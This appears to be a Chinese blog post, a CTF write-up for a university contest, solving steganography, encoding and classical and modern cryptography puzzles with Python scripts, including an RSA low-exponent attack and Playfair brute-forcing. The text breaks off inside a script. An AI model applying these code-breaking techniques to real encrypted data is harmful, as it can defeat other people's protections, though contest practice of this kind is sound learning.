@@ -1,0 +1,919 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>CUMMT双月赛二 | Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="John Doe">
+    
+
+    
+    <meta name="description" content="前言By 窝不管窝的flag都队 放假之后，荒废在家，参加一下月赛。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMMT双月赛二">
+<meta property="og:url" content="http://example.com/2019/01/24/%E5%A4%A7%E5%AD%A6CTF/CUMT%E5%8F%8C%E6%9C%88%E8%B5%9B%E4%BA%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言By 窝不管窝的flag都队 放假之后，荒废在家，参加一下月赛。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZh2TK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZhHmt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kevSh9.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kevZAe.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kevQjP.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knDZKf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knDuVg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMsAdf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMs3wV.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMs2SH.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZoY3F.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZoHgg.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/kny8xI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/26/knyJMt.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZ41AK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZ4nXR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZ4NjA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZ4BAf.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/24/kZ4OD1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmV6L4.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmVLTA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmtujJ.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmtQBR.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmt3Ax.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmUBff.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmUXA1.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmapcD.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmaG40.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kM0tK0.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kM02qK.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMBUSA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/28/kMBrTS.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/27/kuqufs.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/27/kuq1XV.md.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190127203751806.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190127203952250.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190128234428287.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190128234349232.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190128125438633.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190128125230841.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/01/25/kmRqk8.png">
+<meta property="article:published_time" content="2019-01-24T07:05:11.000Z">
+<meta property="article:modified_time" content="2019-05-09T09:56:35.426Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/01/24/kZh2TK.png">
+
+    
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/tou1.png">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/%02.css">
+<link rel="stylesheet" href="/.css">
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body>
+    <header>
+      
+<div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.jpg" alt="Hexo" title="Hexo"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Hexo">Hexo</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+						<li><a href="/tags">Tags</a></li>
+					
+						<li><a href="/categories">Categories</a></li>
+					
+					<li>
+ 					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:example.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/01/24/大学CTF/CUMT双月赛二/" title="CUMMT双月赛二" itemprop="url">CUMMT双月赛二</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="John Doe" target="_blank" itemprop="author">John Doe</a>
+		
+  <p class="article-time">
+    <time datetime="2019-01-24T07:05:11.000Z" itemprop="datePublished"> Published 2019-01-24</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#misc%E7%AD%BE%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">misc签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BXS%E7%9A%84%E5%9B%BE%E6%A0%87%E7%9C%9F%E5%A5%BD%E7%9C%8B"><span class="toc-number">2.2.</span> <span class="toc-text">BXS的图标真好看</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base%E5%85%A8%E5%AE%B6%E6%A1%B6%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B%EF%BC%9F%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">base全家桶了解一下？？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%BF%E5%A4%A7%E6%A0%A1%E6%AD%8C%E8%AE%A4%E7%9C%9F%E5%90%AC%E5%90%AC%E5%90%A7%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">矿大校歌认真听听吧？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%B7%E5%BA%8A%E6%94%B9error%E5%95%A6"><span class="toc-number">5.</span> <span class="toc-text">起床改error啦</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number"></span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">现代密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E7%AD%BE%E5%88%B0"><span class="toc-number">2.</span> <span class="toc-text">古典密码签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyrsa"><span class="toc-number">3.</span> <span class="toc-text">easyrsa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#playfir"><span class="toc-number">4.</span> <span class="toc-text">playfir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98"><span class="toc-number">5.1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimpleUpoad%E7%AD%BE%E5%88%B0"><span class="toc-number">5.2.</span> <span class="toc-text">SimpleUpoad签到</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SimpleSQLi-1"><span class="toc-number">5.3.</span> <span class="toc-text">SimpleSQLi-1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%9E%8B%E7%BA%BF%E4%B8%8A%E8%B5%8C%E5%9C%BA"><span class="toc-number">6.</span> <span class="toc-text">小型线上赌场</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">7.</span> <span class="toc-text">文件管理系统</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number"></span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%86%E5%90%91%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">逆向签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Math"><span class="toc-number">2.</span> <span class="toc-text">Easy_Math</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn"><span class="toc-number"></span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Welcome"><span class="toc-number">1.</span> <span class="toc-text">Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#how"><span class="toc-number">1.1.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#login"><span class="toc-number">2.</span> <span class="toc-text">login</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-1"><span class="toc-number">2.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#brainfxxk"><span class="toc-number">3.</span> <span class="toc-text">brainfxxk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-2"><span class="toc-number">3.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babynote"><span class="toc-number">4.</span> <span class="toc-text">babynote</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#how-1"><span class="toc-number">4.1.</span> <span class="toc-text">how</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp-3"><span class="toc-number">4.2.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-1"><span class="toc-number"></span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E9%A2%98-1"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li></ol>
+		
+		</div>
+		
+		<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>By 窝不管窝的flag都队</p>
+<p>放假之后，荒废在家，参加一下月赛。<span id="more"></span></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h4><p><img src="https://s2.ax1x.com/2019/01/24/kZh2TK.png" alt="kZh2TK.png"></p>
+<p>有很多的提示，然后下载压缩包<br><img src="https://s2.ax1x.com/2019/01/24/kZhHmt.png" alt="kZhHmt.png"></p>
+<p>然后上网看看盲文符号，与图片一一对应得到BAIND，提交是不对的，提示中说a和1是一样的，把a换成1即可。</p>
+<h4 id="BXS的图标真好看"><a href="#BXS的图标真好看" class="headerlink" title="BXS的图标真好看"></a>BXS的图标真好看</h4><p>查看题目，下载一个压缩包，解压后是一个.txt文件，<br><img src="https://s2.ax1x.com/2019/01/25/kevSh9.png" alt="kevSh9.png"></p>
+<p>更改文件后缀名为.jpg或者.png<br><img src="https://s2.ax1x.com/2019/01/25/kevZAe.png" alt="kevZAe.png"></p>
+<p>提示中提示到古典密码，简单观察这个字符串，猜测是栅栏密码，<br><img src="https://s2.ax1x.com/2019/01/25/kevQjP.png" alt="kevQjP.png"></p>
+<h3 id="base全家桶了解一下？？"><a href="#base全家桶了解一下？？" class="headerlink" title="base全家桶了解一下？？"></a>base全家桶了解一下？？</h3><p>base64解码 - base32解码 - base16解码 得到flag</p>
+<h3 id="矿大校歌认真听听吧？"><a href="#矿大校歌认真听听吧？" class="headerlink" title="矿大校歌认真听听吧？"></a>矿大校歌认真听听吧？</h3><p>一个 <code>ZIP</code> 压缩包，需要密码，先不管三七二十一拖到 Kali Linux 里，还是有密码，说明不是伪加密。</p>
+<p>用 010 Editor 打开，在最后看到了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf2019</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/01/26/knDZKf.png" alt="img"></p>
+<p>这很可能是解压密码，试了下果然是。</p>
+<p>解压出来一个 <code>MP3</code> 文件，直接用 MP3Stego 工具，猜测密码和解压密码一致，则在 cmd 中输入以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode -X cumt.mp3 -P cumtctf2019</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/01/26/knDuVg.png" alt="img"></p>
+<p>得到一个 <code>.txt</code> 文本文件，里面有我们要的 flag ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="起床改error啦"><a href="#起床改error啦" class="headerlink" title="起床改error啦"></a>起床改error啦</h3><p>唯一做到的Misc……队友Source太给力……拿到手是个png图片</p>
+<p><img src="https://s2.ax1x.com/2019/01/28/kMsCQA.jpg" alt="kMsCQA.jpg"></p>
+<p>丢进十六进制编辑器，发现猫腻，有zip文件头和flag信息；</p>
+<p><img src="https://s2.ax1x.com/2019/01/28/kMsAdf.png" alt="kMsAdf.png"></p>
+<p>扒下来另存为zip，解压得到flag.doc，但是里面没有flag；</p>
+<p><img src="https://s2.ax1x.com/2019/01/28/kMs3wV.png" alt="kMs3wV.png"></p>
+<p>提示直接告诉是doc隐写，那就显示隐藏文字即可，得到flag；</p>
+<p><img src="https://s2.ax1x.com/2019/01/28/kMs2SH.png" alt="kMs2SH.png"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="现代密码签到"><a href="#现代密码签到" class="headerlink" title="现代密码签到"></a>现代密码签到</h3><p>没想到居然那么简单 QAQ。就是两次 DES 加密，密钥为空（缺省，比特全 0）。</p>
+<p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+p43JX7+KrdUBXg/UTw+ejas2dbmiVanvVSxOuhSdp3JLc+7G4zK5p</span><br><span class="line">hHvL/5MHRKFV/L2THW1XCylB3U+pxCxbmnpQ2RB2ZTU=U2FsdGVkX1+p43JX7+KrdUBXg/UTw+ejas2dbmiVanvVSxOuhSdp3JLc+7G4zK5p</span><br><span class="line">hHvL/5MHRKFV/L2THW1XCylB3U+pxCxbmnpQ2RB2ZTU=</span><br></pre></td></tr></table></figure>
+
+<p>在线工具：<a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_des.html">https://www.sojson.com/encrypt_des.html</a></p>
+<p>解密一次得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</span><br></pre></td></tr></table></figure>
+
+<p>再解密一次得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;double_D3s_HHH&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="古典密码签到"><a href="#古典密码签到" class="headerlink" title="古典密码签到"></a>古典密码签到</h3><p>题目：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A=</span><br></pre></td></tr></table></figure>
+
+<p>大写字母、数字、=，猜测是 base32 。</p>
+<p>解下得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^pho^oav`</span><br><span class="line">tZnj`</span><br><span class="line">tZZZcccx</span><br></pre></td></tr></table></figure>
+
+<p>看不出什么，但都是可打印字符，方向应该没错。</p>
+<p>猜测移位，使用工具恺撒爆破</p>
+<p><img src="https://s2.ax1x.com/2019/01/24/kZoY3F.png" alt="img"></p>
+<p>发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">^umt^tfa`</span><br><span class="line">yEso`</span><br><span class="line">yEEEhhhc</span><br></pre></td></tr></table></figure>
+
+<p>猜测 <code>^</code> 代表 <code>c</code> ，但是另一种字符代表什么无从而知，而且有换行，就很奇怪。后来灵感一来，可能是直接在 ASCII 范围内移位，偏移量 5，于是就有了以下 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">c = base64.b32decode(<span class="string">&quot;LZYGQ326N5QXMYAKORNG42TABJ2FUWS2MNRWG6A=&quot;</span>)</span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> c:</span><br><span class="line">    s += <span class="built_in">chr</span>((<span class="built_in">ord</span>(x)+<span class="number">5</span>)%<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span> s</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="https://s2.ax1x.com/2019/01/24/kZoHgg.png" alt="img"></p>
+<p>这个不可打印字符是啥？这个后来是靠猜的。一开始根据上下文觉得是 <code>as</code> 的变体，为什么说是“变体”？因为 <code>s</code> 已经在其他字符中出现的，在这里以这种形式出现就很奇怪，后来试了 <code>a5</code> （因为 <code>0x0f</code> 是<code>15</code>，而 <code>1</code> 可代表 <code>a</code>）失败了。后来再试试 <code>as</code> ，居然对了，故最终 flag 是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;easy_soeasy___hhh&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后来发现换行 <code>\n</code> 其实是两个字符，分别对应明文 <code>a</code> 和 <code>s</code>。</p>
+<h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>看到 <code>e = 5</code> ，猜测考察的是 RSA 低加密指数攻击。</p>
+<p>先统计下 <code>n</code> 中有哪些字符：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>字词</th>
+<th>频次</th>
+<th>频率 %</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>5</td>
+<td>31</td>
+<td>10.8392</td>
+</tr>
+<tr>
+<td>2</td>
+<td>4</td>
+<td>28</td>
+<td>9.7902</td>
+</tr>
+<tr>
+<td>3</td>
+<td>0</td>
+<td>27</td>
+<td>9.4406</td>
+</tr>
+<tr>
+<td>4</td>
+<td>9</td>
+<td>27</td>
+<td>9.4406</td>
+</tr>
+<tr>
+<td>5</td>
+<td>A</td>
+<td>25</td>
+<td>8.7413</td>
+</tr>
+<tr>
+<td>6</td>
+<td>b</td>
+<td>25</td>
+<td>8.7413</td>
+</tr>
+<tr>
+<td>7</td>
+<td>1</td>
+<td>23</td>
+<td>8.042</td>
+</tr>
+<tr>
+<td>8</td>
+<td>7</td>
+<td>23</td>
+<td>8.042</td>
+</tr>
+<tr>
+<td>9</td>
+<td>2</td>
+<td>21</td>
+<td>7.3427</td>
+</tr>
+<tr>
+<td>10</td>
+<td>6</td>
+<td>19</td>
+<td>6.6434</td>
+</tr>
+<tr>
+<td>11</td>
+<td>8</td>
+<td>19</td>
+<td>6.6434</td>
+</tr>
+<tr>
+<td>12</td>
+<td>3</td>
+<td>18</td>
+<td>6.2937</td>
+</tr>
+</tbody></table>
+<p>猜测是十二进制，<code>A</code> 代表十进制 <code>10</code>， <code>b</code> 代表十进制 <code>11</code>。故可以直接写出 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Trans</span>(<span class="params">n</span>):</span></span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    l = <span class="built_in">len</span>(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> n[i].isdigit():</span><br><span class="line">            ans += <span class="built_in">int</span>(n[i])</span><br><span class="line">        <span class="keyword">elif</span> n[i] == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">            ans += <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ans += <span class="number">11</span></span><br><span class="line">        ans *= <span class="number">12</span></span><br><span class="line">    <span class="keyword">return</span> ans/<span class="number">12</span></span><br><span class="line"></span><br><span class="line">n = <span class="string">&quot;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&quot;</span></span><br><span class="line">e = <span class="string">&quot;5&quot;</span></span><br><span class="line">c = <span class="string">&quot;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&quot;</span></span><br><span class="line"></span><br><span class="line">n = Trans(n)</span><br><span class="line">e = Trans(e)</span><br><span class="line">c = Trans(c)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">if</span>(gmpy2.iroot(c+i*n, e)[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        x = gmpy2.iroot(c+i*n, e)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(x).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="playfir"><a href="#playfir" class="headerlink" title="playfir"></a>playfir</h3><p>题目告诉我们这是 Playfair 密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flaga=&#x27;flaga*******&#x27; key1=**** c1=DMBCCVTLMNKQ</span><br><span class="line">flagb=&#x27;flagb*******&#x27; key2=**** c2=LRBECXPTCPHU</span><br></pre></td></tr></table></figure>
+
+<p>因为密钥只有 4 位，那就直接爆破，这样要枚举 $4^{25}$ 个密钥，也不算多，出题人应该不会把密钥字符设为重复的，这样我们就直接跳过密钥中有重复字符的情况。实际上，即使密钥不同，也可能出现解出来明文相同的情况，这样我们可以使用数据结构 <code>set</code> 去重，这样我们在后期找真正明文的时候会容易些。</p>
+<p>以前没写过这种密码的脚本，脚本可以从网上 down（我下的脚本有点bug，但是至少可以用），然后改改，这是一种节省时间<del>其实是懒</del>的方法。</p>
+<p>上 Python 脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span 